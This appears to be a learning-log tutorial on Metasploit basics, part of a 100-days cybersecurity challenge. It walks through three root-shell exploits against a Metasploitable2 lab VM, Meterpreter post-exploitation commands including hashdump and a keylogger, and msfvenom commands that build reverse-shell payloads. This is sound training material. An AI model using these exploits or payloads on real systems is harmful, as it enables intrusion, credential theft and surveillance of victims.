# Day 025 - Metasploit Framework: Basics

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate

---

## 🧠 The Concept

Yesterday we found vulnerabilities. Today we exploit them.

Metasploit is the world's most widely used penetration testing framework. It turns the gap between "vulnerability exists" and "I have a shell" into a handful of commands.

Understanding Metasploit is non-negotiable for offensive security work - and equally important for defenders who need to understand what attackers are doing.

> ⚠️ Use only against systems you own or have written permission to test. All examples use Metasploitable2 - the deliberately vulnerable lab VM from Day 19.

---

## 🏗️ Metasploit Architecture

```
Metasploit Framework
├── Exploits      → code that takes advantage of a vulnerability
├── Payloads      → what runs on the target after exploitation
│   ├── Singles   → self-contained (one packet)
│   ├── Stagers   → small payload that downloads the rest
│   └── Stages    → the full payload (Meterpreter, shell)
├── Auxiliaries   → scanners, fuzzers, no exploitation
├── Post          → post-exploitation modules
├── Encoders      → obfuscate payloads to evade AV
└── NOPs          → padding for exploit reliability
```

---

## 🖥️ Core Commands

```bash
# Launch Metasploit
msfconsole

# Search for a module
msf6 > search vsftpd
msf6 > search type:exploit platform:linux samba
msf6 > search cve:2017-0144

# Use a module
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# Show module information
msf6 > info

# Show required options
msf6 > show options

# Set options
msf6 > set RHOSTS 192.168.56.101    # target IP
msf6 > set RPORT 21                  # target port
msf6 > set LHOST 192.168.56.1        # your IP (for reverse shells)
msf6 > set LPORT 4444                # your listening port

# Show available payloads
msf6 > show payloads

# Set payload
msf6 > set payload cmd/unix/interact

# Run the exploit
msf6 > run
# or
msf6 > exploit

# Background a session
msf6 > background

# List active sessions
msf6 > sessions -l

# Interact with a session
msf6 > sessions -i 1
```

---

## 🧪 Lab Walkthrough - 3 Exploits on Metasploitable2

### Exploit 1: vsftpd 2.3.4 Backdoor (CVE-2011-2523)

The backdoor we found yesterday. A smiley face in the username triggers a root shell on port 6200.

```bash
msfconsole

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
msf6 exploit(vsftpd_234_backdoor) > run

# Output:
# [*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)
# [*] 192.168.56.101:21 - USER: 331 Please specify the password.
# [+] 192.168.56.101:21 - Backdoor service has been spawned
# [+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)
# [*] Found shell.

whoami
# root
```

Root in under 10 seconds. This is what CVSS 10.0 looks like in practice.

---

### Exploit 2: Samba "Username Map Script" (CVE-2007-2447)

```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOSTS 192.168.56.101
msf6 exploit(usermap_script) > set LHOST 192.168.56.1
msf6 exploit(usermap_script) > run

# [*] Started reverse TCP double handler
# [*] Accepted the first client connection...
# [*] Command shell session 1 opened

whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

### Exploit 3: IRC UnrealIRCd Backdoor (CVE-2010-2075)

```bash
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.101
msf6 exploit(unreal_ircd_3281_backdoor) > run

# [*] Connected to 192.168.56.101:6667
# [*] Sending backdoor command...
# [*] Command shell session 2 opened

whoami
# root
```

Three different services. Three different CVEs. Three root shells.

This is why patching matters.

---

## 🦎 Meterpreter - Advanced Payload

Meterpreter is Metasploit's advanced payload. Runs entirely in memory - no files on disk.

```bash
msf6 > use exploit/multi/handler
msf6 > set payload linux/x86/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.56.1
msf6 > set LPORT 4444
msf6 > run

# Once session opens:
meterpreter > help           # show all commands
meterpreter > sysinfo        # system information
meterpreter > getuid         # current user
meterpreter > getpid         # current process ID
meterpreter > ps             # list processes
meterpreter > shell          # drop to system shell
meterpreter > upload file    # upload a file
meterpreter > download file  # download a file
meterpreter > hashdump       # dump password hashes
meterpreter > keyscan_start  # start keylogger
meterpreter > screenshot     # take screenshot
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.1  # port forward
```

---

## 🔧 msfvenom - Generating Standalone Payloads

msfvenom creates payloads that run outside Metasploit.

```bash
# Linux reverse shell ELF binary
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -f elf -o shell.elf

# Windows reverse shell EXE
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -f exe -o shell.exe

# PHP webshell
msfvenom -p php/reverse_php \
  LHOST=192.168.56.1 LPORT=4444 \
  -f raw -o shell.php

# Python reverse shell
msfvenom -p cmd/unix/reverse_python \
  LHOST=192.168.56.1 LPORT=4444 \
  -f raw -o shell.py

# List all payloads
msfvenom -l payloads
```

---

## 📝 Workflow Reference

```bash
# 1. Find the module
search [service/CVE/keyword]

# 2. Select it
use [module path]

# 3. Check requirements
show options

# 4. Set required values
set RHOSTS [target]
set LHOST [your IP]

# 5. Verify payload
show payloads
set payload [payload]

# 6. Run
exploit

# 7. Post-exploitation
sessions -l
sessions -i [id]
```

---

## 🔑 Key Takeaways

- Metasploit turns CVE numbers into shells - this is why version disclosure matters
- `search`, `use`, `set`, `run` - four commands cover 80% of usage
- Meterpreter runs in memory - harder to detect than a standard shell
- msfvenom generates payloads for delivery outside Metasploit
- Three different Metasploitable services, three root shells - patch everything
- Defenders: these modules exist for every unpatched service in your environment

---

## 📚 Resources to Go Deeper
- [Metasploit Unleashed (free course)](https://www.offsec.com/metasploit-unleashed/)
- [Rapid7 Metasploit Docs](https://docs.rapid7.com/metasploit/)
- [TryHackMe - Metasploit Room (free)](https://tryhackme.com/room/metasploitintro)

---

## [⬅️ Day 024](../day024/) | [➡️ Day 026](../day026/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*